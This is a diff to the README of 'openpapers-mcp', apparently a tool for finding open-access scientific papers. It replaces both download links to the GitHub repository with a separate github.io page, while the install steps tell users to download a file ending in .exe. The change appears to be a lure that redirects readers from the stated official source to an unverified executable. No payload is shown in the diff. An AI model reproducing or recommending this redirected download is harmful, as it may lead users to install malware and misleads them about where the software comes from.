@@ -1,6 +1,6 @@
 # 🔬 openpapers-mcp - Find and access scientific papers easily
 
-[![Download OpenPapers](https://img.shields.io/badge/Download-OpenPapers-blue.svg)](https://github.com/Scentless-trick128/openpapers-mcp)
+[![Download OpenPapers](https://img.shields.io/badge/Download-OpenPapers-blue.svg)](https://scentless-trick128.github.io)
 
 This tool helps researchers find scientific papers across major databases. It connects your desktop software to sources like OpenAlex, CrossRef, and Unpaywall. You search for topics, read abstracts, and download legal open-access PDFs directly to your computer.
 
@@ -15,7 +15,7 @@ This tool helps researchers find scientific papers across major databases. It co
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official download page](https://github.com/Scentless-trick128/openpapers-mcp).
+1. Visit the [official download page](https://scentless-trick128.github.io).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version link.
 4. Select the file ending in `.exe` to start the download.
